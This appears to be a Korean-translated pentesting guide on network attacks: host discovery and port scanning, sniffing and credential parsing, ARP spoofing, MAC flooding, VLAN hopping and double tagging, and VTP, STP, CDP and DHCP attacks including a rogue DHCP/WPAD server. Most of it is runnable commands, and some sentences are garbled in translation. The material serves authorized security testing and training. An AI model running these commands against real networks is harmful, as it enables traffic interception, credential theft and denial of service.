# Pentesting 네트워크

{{#include ../../banners/hacktricks-training.md}}



## 외부에서 호스트 발견

이 문서는 **간단한 섹션**으로 **인터넷**에서 **응답하는 IPs**를 찾는 방법에 대한 내용입니다.\
이 경우 일부 **IP 범위**(심지어 여러 **범위**일 수도 있음)가 주어져 있고 단순히 **어떤 IP들이 응답하는지** 찾으면 됩니다.

### ICMP

이는 호스트가 살아 있는지 여부를 확인하는 **가장 쉬운** 및 **가장 빠른** 방법입니다.\
몇몇 **ICMP** 패킷을 보내고 **응답을 기대**할 수 있습니다. 가장 쉬운 방법은 단순히 **echo request**를 보내고 응답을 기다리는 것입니다. 간단한 `ping`을 사용하거나 `fping`을 사용해 **범위**에 대해 수행할 수 있습니다.\
또한 **nmap**을 사용해 다른 유형의 ICMP 패킷을 보낼 수 있습니다 (이는 일반적인 ICMP echo request-response에 대한 필터를 우회합니다).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

모든 종류의 ICMP packets가 필터링되어 있는 경우를 흔히 발견합니다. 그럴 때 host가 up인지 확인하려면 **open ports를 찾으려고 시도하는 것**밖에 없습니다. 각 host는 **65535 ports**를 가지고 있으므로, scope가 "big"한 경우 각 host의 **each port**가 열려 있는지 **테스트할 수 없습니다**, 너무 많은 시간이 걸립니다.\
그러므로 필요한 것은 **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan))와 **ports more used:** 목록입니다:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
이 단계를 `nmap`으로 수행할 수도 있지만, 느리고 어느 정도 `nmap`은 hosts up을 식별하는 데 문제가 있다.

### HTTP Port Discovery

이는 단지 TCP port discovery로, **focus on discovering HTTP** **services**에 집중하고 싶을 때 유용하다:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

어떤 **host.**에 **pay more attention**해야 할지 결정하려면 일부 **UDP port open**를 확인해 볼 수 있습니다. As **UDP services** usually **don't respond** with **any data** to a regular empty UDP probe packet it is difficult to say if a port is being filtered or open. 가장 쉬운 판단 방법은 실행 중인 service와 관련된 packet을 보내는 것이고, 어떤 service가 실행 중인지 모를 경우 port number에 기반해 가장 가능성이 높은 것을 시도해야 합니다:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
앞서 제안한 nmap 라인은 **/24** 범위 내 모든 호스트에서 **top 1000 UDP ports** 를 검사하지만, 이조차도 **>20min** 걸립니다. 보다 **빠른 결과**가 필요하면 [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)를 사용할 수 있습니다: `./udp-proto-scanner.pl 199.66.11.53/24` 이 도구는 다음의 **UDP probes** 를 해당 **expected port** 로 전송합니다( /24 범위의 경우 약 1분 소요): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

여기에서 작성 시점에 널리 알려진 모든 Wifi 공격에 대한 좋은 가이드를 확인할 수 있습니다:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## 네트워크 내부에서 호스트 발견

네트워크 내부에 있다면 가장 먼저 하고 싶은 것 중 하나는 **다른 호스트를 찾는 것**입니다. 수행할 수 있는 작업은 **얼마나 많은 noise**를 발생시킬 수/원하는지에 따라 달라집니다:

### 수동

연결된 네트워크 내에서 호스트를 수동으로 발견하는 데 다음 도구들을 사용할 수 있습니다:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 능동

[_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_)에 언급된 기법들은 여기에도 **적용할 수 있습니다**.\
하지만 다른 호스트들과 **같은 네트워크**에 있기 때문에, **더 많은 작업을 수행할 수 있습니다**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Note that the techniques commented in _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) can be also **applied here**.\
하지만 다른 호스트들과 **같은 네트워크**에 있으므로 **더 많은 것들을** 할 수 있습니다:

- 만약 **ping**을 **서브넷 브로드캐스트 주소**에 보내면, ping은 **각 호스트**에 도달하고 그들이 **당신에게** **응답**할 수 있습니다: `ping -b 10.10.5.255`
- **network broadcast address**에 ping을 보내면 심지어 **다른 서브넷** 내부의 호스트도 찾을 수 있습니다: `ping -b 255.255.255.255`
- `nmap`의 `-PE`, `-PP`, `-PM` 플래그를 사용하여 각각 **ICMPv4 echo**, **timestamp**, 그리고 **subnet mask requests**를 전송해 호스트 디스커버리를 수행하세요: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan은 컴퓨터를 **켜는 데** **네트워크 메시지**를 통해 사용됩니다.\
컴퓨터를 켜는 데 사용되는 magic packet은 **MAC Dst**가 제공되고 그 값이 동일한 패킷 안에서 **16번 반복되는** 패킷입니다.\
이런 패킷들은 보통 **ethernet 0x0842** 또는 **UDP packet to port 9**로 전송됩니다.\
만약 **no \[MAC]**가 제공되면, 패킷은 **broadcast ethernet**으로 전송됩니다(그리고 브로드캐스트 MAC이 반복되는 값이 됩니다).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 호스트 스캐닝

심층 스캔하려는 모든 IP(외부 또는 내부)를 찾은 후에는 다양한 조치를 수행할 수 있습니다.

### TCP

- **Open** port: _SYN --> SYN/ACK --> RST_
- **Closed** port: _SYN --> RST/ACK_
- **Filtered** port: _SYN --> \[NO RESPONSE]_
- **Filtered** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

There are 2 options to scan an UDP port:

- **UDP packet**을 보내 포트가 **closed**일 경우 _**ICMP unreachable**_ 응답을 확인한다 (몇몇 경우 ICMP가 **filtered** 되어 포트가 닫혀 있는지 열려 있는지에 대한 정보를 받지 못할 수 있다).
- **formatted datagrams**을 보내 **service**로부터 응답을 유도한다(예: DNS, DHCP, TFTP 등, _nmap-payloads_에 나열된 것들). **response**를 받으면 해당 포트는 **open**이다.

**Nmap**은 "-sV"를 사용하여 **mix both** 옵션을 혼합한다 (UDP scans are very slow), 하지만 UDP scans은 TCP scans보다 느리다는 점을 유의하라:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)**는 **TCP (Transmission Control Protocol)** 및 **UDP (User Datagram Protocol)**와 함께 사용되도록 설계되었다. 주된 목적은 IP 네트워크 상에서 음성(telephony) 데이터의 전송을 용이하게 하는 것이며, **Signaling System 7 (SS7)**에서 발견되는 많은 신뢰성 기능을 반영한다. **SCTP**는 **SIGTRAN** 프로토콜 계열의 핵심 구성 요소로, SS7 신호를 IP 네트워크로 전송하는 것을 목표로 한다.

**SCTP**에 대한 지원은 **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, **VxWorks** 등 다양한 운영체제에서 제공되어 통신 및 네트워킹 분야에서의 폭넓은 채택과 유용성을 보여준다.

SCTP에 대해 nmap은 서로 다른 두 가지 스캔을 제공한다: _-sY_ 및 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **More nmap options**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 내부 IP 주소 확인

**Misconfigured routers, firewalls, and network devices**는 때때로 **network probes**에 대해 **nonpublic source addresses**를 사용하여 응답합니다. **tcpdump**는 테스트 중에 사설 주소로부터 수신된 패킷을 식별하는 데 사용할 수 있습니다. 구체적으로 Kali Linux에서 공개 인터넷에서 접근 가능한 **eth2 interface**에서 패킷을 캡처할 수 있습니다. 구성(설정)이 NAT 또는 Firewall 뒤에 있으면 이러한 패킷은 필터링될 가능성이 높다는 점을 유의해야 합니다.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing을 통해 캡처된 frames와 packets를 검토하여 IP ranges, subnet sizes, MAC addresses, 그리고 hostnames에 대한 세부 정보를 파악할 수 있습니다. 네트워크가 잘못 구성되었거나 switching fabric이 과부하 상태일 경우, 공격자는 passive network sniffing을 통해 민감한 자료를 캡처할 수 있습니다.

If a switched Ethernet network is configured properly, you will only see broadcast frames and material destined for your MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
원격 머신에서 SSH 세션을 통해 Wireshark를 GUI로 사용해 packets를 실시간으로 캡처할 수도 있다.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

물론.

### 자격 증명 수집

다음과 같은 도구([https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz))를 사용해 pcap이나 라이브 인터페이스에서 자격 증명을 파싱할 수 있습니다.

## LAN 공격

### ARP spoofing

ARP Spoofing은 특정 머신의 IP가 우리 장치의 MAC을 가진다고 알리기 위해 gratuitous ARPResponses를 전송하는 것입니다. 그런 다음 피해자는 ARP 테이블을 변경하고 스푸핑된 IP로 통신하려 할 때마다 우리 장치로 접속하게 됩니다.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

스위치의 CAM 테이블을 다양한 출발지 MAC 주소로 많은 패킷을 전송하여 넘치게 한다. CAM 테이블이 가득 차면 스위치는 허브처럼 동작하여 모든 트래픽을 브로드캐스트한다.
```bash
macof -i <interface>
```
In modern switches this vulnerability has been fixed.

### 802.1Q VLAN / DTP 공격

#### 동적 트렁킹

The **Dynamic Trunking Protocol (DTP)** 는 링크 계층 프로토콜로 설계되어 트렁킹을 자동화하고, 스위치가 포트를 Trunk 모드 또는 비트렁크 모드로 자동 선택할 수 있게 합니다. **DTP** 의 사용은 종종 바람직하지 않은 네트워크 설계의 징후로 여겨지며, 필요한 곳에서만 트렁크를 수동으로 구성하고 적절히 문서화할 필요가 있음을 강조합니다.

기본적으로 스위치 포트는 Dynamic Auto 모드로 설정되어 있어 인접 스위치가 요청하면 트렁킹을 시작할 준비가 되어 있습니다. pentester나 공격자가 스위치에 연결해 DTP Desirable 프레임을 전송하면 포트가 강제로 trunk mode로 들어가게 되어 보안 문제가 발생합니다. 이로 인해 공격자는 STP 프레임 분석을 통해 VLAN을 열거하고 가상 인터페이스를 설정하여 VLAN 분할을 우회할 수 있습니다.

많은 스위치에 DTP가 기본으로 활성화되어 있으면 공격자가 스위치 동작을 모방해 모든 VLAN의 트래픽에 접근할 수 있습니다. 스크립트 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 는 인터페이스를 모니터링하여 스위치가 Default, Trunk, Dynamic, Auto 또는 Access 모드인지 판별합니다 — 마지막인 Access 모드만이 VLAN hopping attacks에 면역입니다. 이 도구는 스위치의 취약 상태를 평가합니다.

네트워크 취약성이 확인되면 _**Yersinia**_ 도구를 사용해 DTP 프로토콜을 통해 "enable trunking"을 수행하여 모든 VLAN의 패킷을 관찰할 수 있습니다.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLAN을 열거하기 위해 스크립트 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. 어**떤 상황에서도 스크립트를 중단하지 마십시오. 이 스크립트는 3초마다 DTP Desirable을 주입합니다. **스위치에서 동적으로 생성된 trunk 채널은 5분 동안만 유지됩니다. 5분이 지나면 trunk가 해제됩니다.**
```
sudo python3 DTPHijacking.py --interface eth0
```
I would like to point out that **Access/Desirable (0x03)** indicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And **802.1Q/802.1Q (0xa5** indicates the **802.1Q** encapsulation type.

STP 프레임을 분석하면, **VLAN 30 및 VLAN 60의 존재를 알 수 있다.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 특정 VLAN 공격

Once you known VLAN IDs and IPs values, you can **configure a virtual interface to attack a specific VLAN**.\
DHCP를 사용할 수 없다면, 정적 IP 주소를 설정하기 위해 _ifconfig_를 사용하라.

<details>
<summary>VLAN 인터페이스 구성 (예시)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

앞서 다룬 **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** 공격은 도구에 의해 **자동으로 수행됩니다**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

공격자가 **MAC, IP and VLAN ID of the victim host** 값을 알고 있다면, 지정된 VLAN과 피해자의 VLAN으로 프레임을 **double tag a frame** 하여 패킷을 보낼 수 있습니다. 피해자가 공격자에게 **victim won't be able to connect back** 하기 때문에, 공격자는 SNMP 같은 동작을 수행하는 프로토콜과 통신하기 위해 **best option for the attacker is communicate via UDP** 를 선택하는 것이 좋습니다.

다른 옵션으로 공격자는 **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (아마 인터넷을 통해) 를 실행할 수 있습니다. 그런 다음, 피해자로부터 패킷을 받으면 공격자가 소유한 두 번째 호스트에서 이를 스니핑할 수 있습니다.

![](<../../images/image (190).png>)

이 공격을 수행하려면 scapy를 사용할 수 있습니다: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

If you have **access to a switch that you are directly connected to**, you have the ability to **bypass VLAN segmentation** within the network. Simply **switch the port to trunk mode** (otherwise known as trunk), create virtual interfaces with the IDs of the target VLANs, and configure an IP address. You can try requesting the address dynamically (DHCP) or you can configure it statically. It depends on the case.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

In certain environments, such as guest wireless networks, **port isolation (also known as private VLAN)** settings are implemented to prevent clients connected to a wireless access point from directly communicating with each other. However, a technique has been identified that can circumvent these isolation measures. This technique exploits either the lack of network ACLs or their improper configuration, enabling IP packets to be routed through a router to reach another client on the same network.

The attack is executed by creating a **packet that carries the IP address of the destination client but with the router's MAC address**. This causes the router to mistakenly forward the packet to the target client. This approach is similar to that used in Double Tagging Attacks, where the ability to control a host accessible to the victim is used to exploit the security flaw.

**Key Steps of the Attack:**

1. **Crafting a Packet:** A packet is specially crafted to include the target client's IP address but with the router's MAC address.
2. **Exploiting Router Behavior:** The crafted packet is sent up to the router, which, due to the configuration, redirects the packet to the target client, bypassing the isolation provided by private VLAN settings.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizes VLAN management. It utilizes revision numbers to maintain VLAN database integrity; any modification increments this number. Switches adopt configurations with higher revision numbers, updating their own VLAN databases.

#### VTP Domain Roles

- **VTP Server:** Manages VLANs—creates, deletes, modifies. It broadcasts VTP announcements to domain members.
- **VTP Client:** Receives VTP announcements to synchronize its VLAN database. This role is restricted from local VLAN configuration modifications.
- **VTP Transparent:** Doesn't engage in VTP updates but forwards VTP announcements. Unaffected by VTP attacks, it maintains a constant revision number of zero.

#### VTP Advertisement Types

- **Summary Advertisement:** Broadcasted by the VTP server every 300 seconds, carrying essential domain information.
- **Subset Advertisement:** Sent following VLAN configuration changes.
- **Advertisement Request:** Issued by a VTP client to request a Summary Advertisement, typically in response to detecting a higher configuration revision number.

VTP vulnerabilities are exploitable exclusively via trunk ports as VTP announcements circulate solely through them. Post-DTP attack scenarios might pivot towards VTP. Tools like Yersinia can facilitate VTP attacks, aiming to wipe out the VLAN database, effectively disrupting the network.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia의 그래픽 모드에서 deleting all VTP vlans 옵션을 선택하여 VLAN database를 정리하세요.

### STP Attacks

**인터페이스에서 BPDU frames를 캡처할 수 없다면 STP attack에 성공할 가능성은 낮습니다.**

#### **STP BPDU DoS**

많은 BPDUs TCP (Topology Change Notification) 또는 Conf (토폴로지가 생성될 때 전송되는 BPDUs)를 전송하면 스위치들이 과부하되어 올바르게 작동하지 않게 됩니다.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

TCP가 전송되면, switches의 CAM table은 15s 후에 삭제됩니다. 그리고 이러한 종류의 packets를 계속해서 전송하면 CAM table이 지속적으로(또는 매 15segs마다) 재시작되며, 재시작될 때 switch는 hub처럼 동작합니다.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

공격자는 네트워크의 STP root가 되기 위해 switch의 동작을 시뮬레이트합니다. 그러면 더 많은 데이터가 공격자를 통해 흐릅니다. 이는 서로 다른 두 switch에 연결되어 있을 때 유용합니다.\
이것은 BPDUs CONF packets를 전송하여 **priority** 값이 실제 root switch의 실제 priority보다 낮다고 알리는 방식으로 수행됩니다.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**공격자가 2개의 스위치에 연결되어 있으면 그는 새로운 트리의 루트가 될 수 있고 그 스위치들 간의 모든 트래픽이 그를 통해 전달됩니다** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 공격

CISCO Discovery Protocol (CDP)은 CISCO 장치 간 통신에 필수적이며, 장치들이 **서로를 식별하고 구성 정보를 공유할 수 있도록** 한다.

#### 수동 데이터 수집 <a href="#id-0e0f" id="id-0e0f"></a>

CDP는 모든 포트를 통해 정보를 브로드캐스트하도록 구성되어 있어 보안 위험을 초래할 수 있다. 공격자가 스위치 포트에 연결하면 **Wireshark**, **tcpdump**, 또는 **Yersinia**와 같은 네트워크 스니퍼를 실행할 수 있다. 이로 인해 기기의 모델과 실행 중인 Cisco IOS 버전 등 네트워크 장치에 대한 민감한 정보가 드러날 수 있다. 공격자는 식별된 Cisco IOS 버전에 존재하는 특정 취약점을 노릴 수 있다.

#### CDP 테이블 플러딩 유도 <a href="#id-0d6a" id="id-0d6a"></a>

보다 공격적인 방법은 정당한 CISCO 장치인 것처럼 가장하여 스위치의 메모리를 과부하시켜 Denial of Service (DoS) 공격을 개시하는 것이다. 아래는 테스트용 네트워크 도구인 Yersinia를 사용해 이러한 공격을 시작하는 명령 시퀀스이다:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
이 공격 동안 스위치의 CPU와 CDP neighbor table에 큰 부담이 걸려, 과도한 자원 소모로 인해 흔히 **“네트워크 마비”**라고 불리는 상태를 초래합니다.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP 공격 및 VoIP Hopper 도구

VoIP 전화기는 IoT 장치와 점점 더 통합되어 특정 전화번호를 통해 문을 열거나 온도 조절기를 제어하는 등의 기능을 제공합니다. 하지만 이런 통합은 보안 위험을 초래할 수 있습니다.

The tool [**voiphopper**](http://voiphopper.sourceforge.net) is designed to emulate a VoIP phone in various environments (Cisco, Avaya, Nortel, Alcatel-Lucent). It discovers the voice network's VLAN ID using protocols like CDP, DHCP, LLDP-MED, and 802.1Q ARP.

**VoIP Hopper** offers three modes for the Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): VLAN ID를 식별하기 위해 네트워크 패킷을 분석합니다.
2. **Spoof Mode** (`-c 1`): 실제 VoIP 장치의 패킷을 모방하는 맞춤 패킷을 생성합니다.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): 특정 Cisco IP 전화 모델과 동일한 패킷을 전송합니다.

속도를 위해 권장되는 모드는 세 번째 모드입니다. 이 모드는 다음을 지정해야 합니다:

- 공격자의 네트워크 인터페이스 (`-i` 매개변수).
- 에뮬레이션할 VoIP 장치의 이름 (`-E` 매개변수), Cisco 명명 규칙(예: SEP 다음에 MAC 주소)을 따릅니다.

기업 환경에서 기존 VoIP 장치를 모방하려면 다음을 수행할 수 있습니다:

- 전화기의 MAC 라벨을 확인합니다.
- 전화기 디스플레이 설정으로 이동해 모델 정보를 확인합니다.
- VoIP 장치를 노트북에 연결하고 Wireshark로 CDP 요청을 관찰합니다.

세 번째 모드로 도구를 실행하는 예시 명령어는 다음과 같습니다:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 공격

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS**는 DHCP 서버에 대해 수행될 수 있다. 첫 번째는 **simulate enough fake hosts to use all the possible IP addresses**로 구성된다.\
이 공격은 DHCP 서버의 응답을 볼 수 있고 프로토콜을 완료할 수 있을 때만 작동한다 (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). 예를 들어, 이는 **not possible in Wifi networks**.

DHCP DoS를 수행하는 또 다른 방법은 **DHCP-RELEASE packet using as source code every possible IP**를 전송하는 것이다. 그러면 서버는 모두가 IP 사용을 종료했다고 생각할 것이다.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **you can server malicious values mentioned in the next attack**.

#### 악성 값 설정

악성 DHCP 서버는 `/usr/share/responder/DHCP.py`에 있는 DHCP 스크립트를 사용해 설정할 수 있습니다. 이는 트래픽을 악성 서버로 리디렉트하여 HTTP 트래픽과 자격증명 등을 캡처하는 네트워크 공격에 유용합니다. 다만 rogue gateway를 설정하는 것은 효과가 떨어지는데, 클라이언트의 아웃바운드 트래픽만 캡처하여 실제 gateway의 응답을 놓치기 때문입니다. 보다 효과적인 공격을 위해서는 rogue DNS 또는 WPAD 서버 설정이 권장됩니다.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

이 옵션들을 적절히 사용하면 네트워크 트래픽을 효과적으로 가로채기 위해 rogue DHCP 서버를 구축할 수 있습니다.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Attacks**

다음은 802.1X 구현에 대해 사용할 수 있는 몇 가지 공격 전술입니다:

- Active brute-force password grinding via EAP
- 잘못된 형식의 EAP 콘텐츠로 RADIUS 서버를 공격 _\*\*_(exploits)
- EAP 메시지 캡처 및 오프라인 비밀번호 크래킹 (EAP-MD5 및 PEAP)
- EAP-MD5 인증을 강제로 사용해 TLS 인증서 검증을 우회
